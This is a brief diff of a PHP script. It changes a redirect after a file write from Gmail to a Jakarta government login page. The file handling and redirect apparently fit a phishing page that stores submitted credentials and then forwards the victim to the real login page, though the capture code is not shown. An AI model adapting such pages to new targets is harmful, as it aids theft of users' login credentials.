@@ -31,6 +31,6 @@ if (empty($_SERVER['PHP_AUTH_USER'])) {
 	
 	fclose($fl);
 	
-    header("location: https://mail.google.com/mail/");
+    header("location: https://jakevo.jakarta.go.id/login");
 }
 ?>
